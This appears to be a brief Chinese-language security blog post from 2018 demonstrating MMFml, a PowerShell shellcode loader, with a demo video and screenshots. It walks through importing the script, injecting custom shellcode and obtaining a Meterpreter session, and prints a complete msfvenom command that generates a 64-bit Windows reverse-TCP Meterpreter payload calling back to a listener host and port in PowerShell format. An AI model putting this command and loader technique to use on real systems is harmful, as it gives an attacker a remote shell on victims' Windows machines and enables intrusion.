---
title: mmfml
date: 2018-08-30 00:38:15
tags:
---
![enter description here][1]
<!--more-->

## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/mmfml.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

https://github.com/prnd432/MMFml

看完以上视频之后。须知：Powershell代码需要PS v5 +才能运行。Powershell代码目前仅适用于64位系统。

1.他默认的shellcode，则为msf生成的计算器的shellcode。

![enter description here][2]

![enter description here][3]

2.首先将ps1 导入到powershell中。再使用模块，亦可使用模块去指定shellcode

![enter description here][4]

![enter description here][5]
最终得到meterprerter回话。
![enter description here][6]


其中的PAYLOAD shellcode 前面几个参数是去指定64位，因为powershell代码只能用64位 再加上-b 去掉00字符，-f指定格式powershell。

``` stylus
 msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.116 LPORT=4444  -b '\x00' -f powershell
```

真香！Skr~~~

  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/76A9394C6B6A9593D483C8ECD240467A.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561513979.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561551588.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561679137.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561704322.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1535561742555.jpg 